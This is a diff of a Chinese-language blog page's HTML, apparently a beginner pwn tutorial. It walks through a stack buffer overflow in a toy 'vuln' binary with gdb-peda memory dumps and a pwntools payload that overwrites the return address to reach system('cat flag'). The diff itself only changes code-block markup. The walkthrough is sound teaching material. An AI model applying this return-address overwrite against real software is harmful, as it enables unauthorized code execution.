@@ -107,7 +107,7 @@ int main(){
 
 <p>得到的汇编是这样的</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ pdisas main
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ pdisas main
 Dump of assembler code for function main:
    0x00000000004004ea &lt;+0&gt;:	push   rbp
    0x00000000004004eb &lt;+1&gt;:	mov    rbp,rsp
@@ -149,8 +149,7 @@ Dump of assembler code for function add:
    0x00000000004004e8 &lt;+18&gt;:	pop    rbp
    0x00000000004004e9 &lt;+19&gt;:	ret
 End of assembler dump.
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>使用上篇文章的代码生成的汇编会更复杂，但是暂时这些就够了。</p>
 
@@ -158,7 +157,7 @@ End of assembler dump.
 
 <p><code class="highlighter-rouge">gdb ./vuln</code> 然后 <code class="highlighter-rouge">b 21</code> 在 <code class="highlighter-rouge">gets(student.name);</code> 后面下断点，<code class="highlighter-rouge">r</code> 运行，输入 <code class="highlighter-rouge">1925</code> 和 <code class="highlighter-rouge">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code> 之后可以看到 peda 的输出分为几部分，分为 <code class="highlighter-rouge">registers</code>、<code class="highlighter-rouge">code</code> 和 <code class="highlighter-rouge">stack</code>，分别是寄存器、汇编代码和栈数据分布。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ b 21
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ b 21
 Breakpoint 1 at 0x40072e: file main.c, line 21.
 gdb-peda$ r
 Starting program: /home/virusdefender/Desktop/pwn/new/vuln
@@ -213,12 +212,11 @@ gdb-peda$ p &amp;student
 $1 = (struct Student *) 0x7fffffffe2f0
 gdb-peda$ p sizeof(student)
 $2 = 0x48
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>register 中可以看到 <code class="highlighter-rouge">RBP: 0x7fffffffe340</code>、<code class="highlighter-rouge">RSP: 0x7fffffffe2e0</code> 和 <code class="highlighter-rouge">RIP: 0x40072e</code>，在 stack 中可以看到这两个地址之间的数据，当然空间原因显示的并不全，可以使用 <code class="highlighter-rouge">telescope 16</code> 查看更多的栈内存。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ p $rbp
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ p $rbp
 $6 = (void *) 0x7fffffffe340
 gdb-peda$ p $rsp
 $7 = (void *) 0x7fffffffe2e0
@@ -239,8 +237,7 @@ gdb-peda$ telescope 16
 0104| 0x7fffffffe348 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)
 0112| 0x7fffffffe350 --&gt; 0x0
 0120| 0x7fffffffe358 --&gt; 0x7fffffffe428 --&gt; 0x7fffffffe6b3 ("/home/virusdefender/Desktop/pwn/new/vuln")
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>然后可以简单得到 <code class="highlighter-rouge">student</code> 的内存的范围，<code class="highlighter-rouge">0x7fffffffe2f0 - 0x7fffffffe338</code> 就是在栈中。<code class="highlighter-rouge">0032| 0x7fffffffe340 --&gt; 0x400790 (&lt;__libc_csu_init&gt;:	push   r15)</code> 也印证了这一点，这样 <code class="highlighter-rouge">0x7fffffffe340</code> 地址的数据就很明显是 main 函数的 rbp，<code class="highlighter-rouge">0x7fffffffe348</code> 的数据就是 main 函数的下一句指令的地址。</p>
 
@@ -248,18 +245,16 @@ gdb-peda$ telescope 16
 
 <p>只要把 <code class="highlighter-rouge">system("cat flag");</code> 的地址写入到 <code class="highlighter-rouge">0x7fffffffe348</code> 就可以了，这个地址可以从 <code class="highlighter-rouge">pdisas main</code> 汇编代码中看到</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>0x0000000000400756 &lt;+160&gt;:	mov    edi,0x40087e
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x0000000000400756 &lt;+160&gt;:	mov    edi,0x40087e
 0x000000000040075b &lt;+165&gt;:	mov    eax,0x0
 0x0000000000400760 &lt;+170&gt;:	call   0x400550 &lt;system@plt&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>而 <code class="highlighter-rouge">0x40087e</code> 处就是 <code class="highlighter-rouge">system</code> 的参数</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ x 0x40087e
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ x 0x40087e
 0x40087e:	"cat flag"
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>所以要覆盖成的指令地址就是 <code class="highlighter-rouge">0x0000000000400756</code>，而不能是 <code class="highlighter-rouge">0x0000000000400760</code>，否则函数取到的参数可能是错误的。</p>
 
@@ -267,33 +262,30 @@ gdb-peda$ telescope 16
 
 <p>payload 是</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="k">print</span> <span class="s">"1925</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x7fffffffe348</span> <span class="o">-</span> <span class="mh">0x7fffffffe2f0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400756</span><span class="p">)</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>这里使用了 pwntools 库，p64 函数的作用就是把一个数字转换为内存中分布的形式</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
 <span class="s">'</span><span class="se">\xef\xbe\xad\xde\x00\x00\x00\x00</span><span class="s">'</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>What's Your Birth?
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>What's Your Birth?
 What's Your Name?
 You Are Born In 1094795585
 You Are Naive.
 You Speed One Second Here.
 THIS_IS_FLAG
 [1]    78848 bus error (core dumped)  ./vuln &lt; 1.in
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>运行后虽然能成功的打印出 flag，但是最后进程会 crash，是因为 main 函数的栈底地址被我们覆盖了，如果要避免崩溃，还是需要精细的维护堆栈平衡的。</p>
 
 <p>使用 GDB <code class="highlighter-rouge">b 29</code>，也就是最后的 <code class="highlighter-rouge">return 0</code></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ b 29
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ b 29
 Breakpoint 1 at 0x40077b: file main.c, line 29.
 gdb-peda$ r &lt; 1.in
 Starting program: /home/virusdefender/Desktop/pwn/new/vuln &lt; 1.in
@@ -344,8 +336,7 @@ Legend: code, data, rodata, value
 
 Breakpoint 1, main (argc=0x1, argv=0x7fffffffe428) at main.c:29
 29	    return 0;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>然后输入 <code class="highlighter-rouge">ni</code> 一直回车，注意观察 <code class="highlighter-rouge">code</code> 区域，就可以进行汇编指令级别的单步调试。</p>
 
